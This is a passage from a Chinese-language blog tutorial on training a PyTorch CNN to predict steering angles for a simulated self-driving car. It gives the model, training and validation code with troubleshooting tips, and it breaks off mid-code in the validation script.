&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.file_list)</span><br></pre></td></tr></table></figure><p>上述代码比较简单，我们构造了AutoDriveDataset类用于作为自动驾驶小车数据读取类，从train.txt和val.txt中根据每行内容得到每个样本的图像路径和对应的真值标签。这里需要注意下颜色空间，我们最终是使用HSV空间进行训练的，因此需要做一下转化。</p><p>这里插播一下一个自定义的方法库utils.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AverageMeter</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    平均器类,用于计算平均值、总和</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.reset()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>):</span><br><span class="line">        self.val = <span class="number">0</span></span><br><span class="line">        self.avg = <span class="number">0</span></span><br><span class="line">        self.<span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        self.count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self, val, n=<span class="number">1</span></span>):</span><br><span class="line">        self.val = val</span><br><span class="line">        self.<span class="built_in">sum</span> += val * n</span><br><span class="line">        self.count += n</span><br><span class="line">        self.avg = self.<span class="built_in">sum</span> / self.count</span><br></pre></td></tr></table></figure><p>虽然这个文件里面只有一个类，但创建这样一个文件是习惯。</p><p>有了数据读取类以后我们就下来定义模型，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AutoDriveNet</span>(nn.Module):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    端到端自动驾驶模型</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(AutoDriveNet, self).__init__()</span><br><span class="line">        self.conv_layers = nn.Sequential(nn.Conv2d(<span class="number">3</span>, <span class="number">24</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">24</span>, <span class="number">36</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">36</span>, <span class="number">48</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">48</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.Dropout(<span class="number">0.5</span>))</span><br><span class="line">        self.linear_layers = nn.Sequential(</span><br><span class="line">            <span class="comment">#nn.Linear(in_features=64 * 2 * 33, out_features=100),</span></span><br><span class="line">            nn.Linear(in_features=<span class="number">64</span> * <span class="number">8</span> * <span class="number">13</span>, out_features=<span class="number">100</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">100</span>, out_features=<span class="number">50</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">50</span>, out_features=<span class="number">10</span>),</span><br><span class="line">            nn.Linear(in_features=<span class="number">10</span>, out_features=<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, <span class="built_in">input</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        前向推理</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">input</span> = <span class="built_in">input</span>.view(<span class="built_in">input</span>.size(<span class="number">0</span>), <span class="number">3</span>, <span class="number">120</span>, <span class="number">160</span>)</span><br><span class="line">        output = self.conv_layers(<span class="built_in">input</span>)</span><br><span class="line">        output = output.view(output.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        output = self.linear_layers(output)</span><br><span class="line">        <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><p>这里需要注意的是我们的模型跟论文里的稍微有点不一样(见下)，主要是因为我们的图像尺寸是120x160的，而论文里使用的是66x200。因此，我们对应的输入需要调整下，另外，在最后全连接层也相应的在维度上要调整。对于实际项目来说，现在很多的摄像头都是使用3:4分辨率的，例如树莓派摄像头典型的分辨率是480x640，因此，修改过后的模型更具有普遍性，还方便后面迁移到真实环境训练。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">self.conv_layers = nn.Sequential(nn.Conv2d(<span class="number">3</span>, <span class="number">24</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">24</span>, <span class="number">36</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(),</span><br><span class="line">                                         nn.Conv2d(<span class="number">36</span>, <span class="number">48</span>, <span class="number">5</span>, stride=<span class="number">2</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">48</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.ELU(), nn.Conv2d(<span class="number">64</span>, <span class="number">64</span>, <span class="number">3</span>),</span><br><span class="line">                                         nn.Dropout(<span class="number">0.5</span>))</span><br><span class="line">self.linear_layers = nn.Sequential(</span><br><span class="line">            <span class="comment">#nn.Linear(in_features=64 * 2 * 33, out_features=100),</span></span><br><span class="line">            nn.Linear(in_features=<span class="number">64</span> * <span class="number">8</span> * <span class="number">13</span>, out_features=<span class="number">100</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">100</span>, out_features=<span class="number">50</span>),</span><br><span class="line">            nn.ELU(),</span><br><span class="line">            nn.Linear(in_features=<span class="number">50</span>, out_features=<span class="number">10</span>),</span><br><span class="line">            nn.Linear(in_features=<span class="number">10</span>, out_features=<span class="number">1</span>))                                         </span><br></pre></td></tr></table></figure><p>整个模型比较简单，前面是多个cnn，最后接几个全连接网络，输入是3通道图像，输出是一个转向回归值。</p><p>训练脚本代码train.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入torch库</span></span><br><span class="line"><span class="keyword">import</span> torch.backends.cudnn <span class="keyword">as</span> cudnn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> AutoDriveDataset</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    训练.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 数据集路径</span></span><br><span class="line">    data_folder = <span class="string">&#x27;./data/simulate&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 学习参数</span></span><br><span class="line">    checkpoint = <span class="literal">None</span>  <span class="comment"># 预训练模型路径，如果不存在则为None</span></span><br><span class="line">    <span class="comment"># checkpoint = &quot;./results/checkpoint.pth&quot;</span></span><br><span class="line">    batch_size = <span class="number">400</span>  <span class="comment"># 批大小</span></span><br><span class="line">    start_epoch = <span class="number">1</span>  <span class="comment"># 轮数起始位置</span></span><br><span class="line">    epochs = <span class="number">1000</span>  <span class="comment"># 迭代轮数</span></span><br><span class="line">    lr = <span class="number">1e-4</span>  <span class="comment"># 学习率</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设备参数</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(torch.cuda.is_available(), device)</span><br><span class="line">    <span class="comment">#ngpu = 4  # 用来运行的gpu数量</span></span><br><span class="line">    cudnn.benchmark = <span class="literal">True</span>  <span class="comment"># 对卷积进行加速</span></span><br><span class="line">    writer = SummaryWriter()  <span class="comment"># 实时监控     使用命令 tensorboard --logdir runs  进行查看</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化模型</span></span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化优化器</span></span><br><span class="line">    optimizer = torch.optim.Adam(params=<span class="built_in">filter</span>(<span class="keyword">lambda</span> p: p.requires_grad,</span><br><span class="line">                                               model.parameters()),</span><br><span class="line">                                 lr=lr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 迁移至默认设备进行训练</span></span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model = model.cuda()</span><br><span class="line">    criterion = nn.MSELoss().to(device)</span><br><span class="line">    criterion = nn.MSELoss().cuda()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载预训练模型</span></span><br><span class="line">    <span class="keyword">if</span> checkpoint <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        checkpoint = torch.load(checkpoint)</span><br><span class="line">        start_epoch = checkpoint[<span class="string">&#x27;epoch&#x27;</span>] + <span class="number">1</span></span><br><span class="line">        model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line">        optimizer.load_state_dict(checkpoint[<span class="string">&#x27;optimizer&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单机多卡训练</span></span><br><span class="line">    <span class="comment"># if torch.cuda.is_available():</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=list(range(ngpu)))</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定制化的dataloader</span></span><br><span class="line">    transformations = transforms.Compose([</span><br><span class="line">        transforms.ToTensor(),  <span class="comment"># 通道置前并且将0-255RGB值映射至0-1</span></span><br><span class="line">        <span class="comment"># transforms.Normalize(</span></span><br><span class="line">        <span class="comment">#     mean=[0.485, 0.456, 0.406],  # 归一化至[-1,1] mean std 来自imagenet 计算</span></span><br><span class="line">        <span class="comment">#     std=[0.229, 0.224, 0.225])</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    train_dataset = AutoDriveDataset(data_folder,</span><br><span class="line">                                     mode=<span class="string">&#x27;train&#x27;</span>,</span><br><span class="line">                                     transform=transformations)</span><br><span class="line">    train_loader = torch.utils.data.DataLoader(train_dataset,</span><br><span class="line">                                               batch_size=batch_size,</span><br><span class="line">                                               shuffle=<span class="literal">True</span>,</span><br><span class="line">                                               num_workers=<span class="number">0</span>,</span><br><span class="line">                                               pin_memory=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始逐轮训练</span></span><br><span class="line">    <span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(start_epoch, epochs + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        model.train()  <span class="comment"># 训练模式：允许使用批样本归一化</span></span><br><span class="line">        loss_epoch = AverageMeter()  <span class="comment"># 统计损失函数</span></span><br><span class="line">        n_iter = <span class="built_in">len</span>(train_loader)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按批处理</span></span><br><span class="line">        <span class="keyword">for</span> i, (imgs, labels) <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):</span><br><span class="line">            <span class="comment"># 数据移至默认设备进行训练</span></span><br><span class="line">            imgs = imgs.to(device)</span><br><span class="line">            labels = labels.to(device)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 前向传播</span></span><br><span class="line">            pre_labels = model(imgs)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算损失</span></span><br><span class="line">            loss = criterion(pre_labels, labels)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 后向传播</span></span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            loss.backward()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新模型</span></span><br><span class="line">            optimizer.step()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 记录损失值</span></span><br><span class="line">            loss_epoch.update(loss.item(), imgs.size(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印结果</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第 &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; 个batch训练结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 手动释放内存</span></span><br><span class="line">        <span class="keyword">del</span> imgs, labels, pre_labels</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 监控损失值变化</span></span><br><span class="line">        writer.add_scalar(<span class="string">&#x27;MSE_Loss&#x27;</span>, loss_epoch.avg, epoch)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;epoch:&#x27;</span> + <span class="built_in">str</span>(epoch) + <span class="string">&#x27;  MSE_Loss:&#x27;</span> + <span class="built_in">str</span>(loss_epoch.avg))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 保存预训练模型</span></span><br><span class="line">        torch.save(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;epoch&#x27;</span>: epoch,</span><br><span class="line">                <span class="comment"># &#x27;model&#x27;: model.module.state_dict(),</span></span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: model.state_dict(),</span><br><span class="line">                <span class="string">&#x27;optimizer&#x27;</span>: optimizer.state_dict()</span><br><span class="line">            &#125;, <span class="string">&#x27;results/checkpoint.pth&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练结束关闭监控</span></span><br><span class="line">    writer.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>新旧版更替，不同的运行环境都有可能导致代码报各种错误。这里真是坑到不行qwq。经过我反复测试，大家报错时可以解开就近的注释部分进行尝试，这应该是目前最为稳定的版本了。</p><p>注意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">writer = SummaryWriter()</span><br><span class="line">writer.add_scalar(<span class="string">&#x27;MSE_Loss&#x27;</span>, loss_epoch.avg, epoch)</span><br></pre></td></tr></table></figure><p>第一行代码及下面的相关方法使得我们可以在pycharm下方终端使用命令 tensorboard –logdir runs  ，点击出现的网页链接(用edge或者chome)，可以看到误差改变情况。如果这行代码报错了，请在终端运行命令  pip install tensorboard等待安装完成。反复刷新浏览器可以更新。根据网页提示进行使用。如果测试的时候运行过太多次，可以修改第二行代码的字符串，会生成一个新的表。删除根目录下run的文件也可以起到减少的作用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ngpu = 4  # 用来运行的gpu数量</span></span><br><span class="line"><span class="comment"># 单机多卡训练</span></span><br><span class="line">    <span class="comment"># if torch.cuda.is_available():</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=list(range(ngpu)))</span></span><br><span class="line">    <span class="comment">#   model = nn.DataParallel(model, device_ids=[0])</span></span><br></pre></td></tr></table></figure><p>只有一个显卡的同学一定要注意保持所有单机多卡训练的代码处于注释状态(我在这儿被坑惨了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">torch.save(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;epoch&#x27;</span>: epoch,</span><br><span class="line">                <span class="comment"># &#x27;model&#x27;: model.module.state_dict(),</span></span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: model.state_dict(),</span><br><span class="line">                <span class="string">&#x27;optimizer&#x27;</span>: optimizer.state_dict()</span><br><span class="line">            &#125;, <span class="string">&#x27;results/checkpoint.pth&#x27;</span>)</span><br></pre></td></tr></table></figure><p>对model字段的保存，有的版本需要用注释里的字段，有的用当前的就行。请注意results文件夹最好手动创建。</p><h3 id="3-4模型验证"><a href="#3-4模型验证" class="headerlink" title="3.4模型验证"></a>3.4模型验证</h3><p>上面的代码需要迭代1000次, epoch&#x3D;1000的时候基本处在一个比较好的收敛位置，此时误差下降到1e-5左右。不过在跑到第140次左右时就已经下降到1e-4，让误差下降一个数量级在实际工程中还是非常重要的，不过同学们在使用的时候其实跑到这样也能用了。</p><p>验证代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.backends.cudnn <span class="keyword">as</span> cudnn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> AutoDriveDataset</span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 测试集目录</span></span><br><span class="line">    data_folder = <span class="string">&quot;./data/simulate&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义运行的GPU数量</span></span><br><span class="line">    ngpu = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># cudnn.benchmark = True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义设备运行环境</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;定义设备环境&quot;</span>)</span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载预训练模型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加载预训练模型&quot;</span>)</span><br><span class="line">    checkpoint = torch.load(<span class="string">&quot;./results/checkpoint.pth&quot;</span>)</span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多GPU封装</span></span><br><span class="line">    <span class="comment">#if torch.cuda.is_available():</span></span><br><span class="line">     <span class="comment">#   model = nn.DataParallel(model, device_ids=list(range(ngpu)))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定制化的dataloader</span></span><br><span class="line">    <span class="comment"># 定制dataloader</span></span><br><span class="line">    transformations = transforms.Compose([</span><br><span class="line">        transforms.ToTensor(),  <span class="comment"># 通道置前并且将0-255RGB值映射至0-1</span></span><br><span class="line">        <span class="comment"># transforms.Normalize(</span></span><br><span class="line">        <span class="comment">#     mean=[0.485, 0.456, 0.406],  # 归一化至[-1,1] mean std 来自imagenet 计算</span></span><br><span class="line">        <span class="comment">#     std=[0.229, 0.224, 0.225])</span></span><br><span class="line">    ])</span><br><span class="line">    val_dataset = AutoDriveDataset(data_folder,</span><br><span class="line">                                   mode=<span class="string">&#x27;val&#x27;</span>,</span><br><span class="line">                                   transform=transformations</span><br><span class="line">                                   )</span><br><span class="line"></span><br><span class="line">    val_loader = torch.utils.data.DataLoader(val_dataset, batch_size=<span class="number">1</span>, shuffle=<span class="literal">False</span>, num_workers=<span class="number">1</span>,</span><br><span class="line">                                             pin_memory=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义评估指标</span></span><br><span class="line">    criterion = nn.MSELoss().to(device)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 记录误差值</span></span><br><span class="line">    MSEs = AverageMeter()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 记录测试时间</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;开始进行测试&quot;</span>)</span><br><span class="line">        <span class="comment"># 逐批样本进行推理计算</span></span><br><span class="line">        <span class="keyword">for</span> i, (imgs, labels) <span class="keyword">in</span> <span class="built_in">enumerate</span>(val_loader):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次计算进行中&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="comment"># 数据移至默认设备进行推理</span></span><br><span class="line">            imgs = imgs.to(device)</span><br><span class="line">            labels = labels.to(device)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 前向传播</span></span><br><span class="line">            pre_labels = model(imgs)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 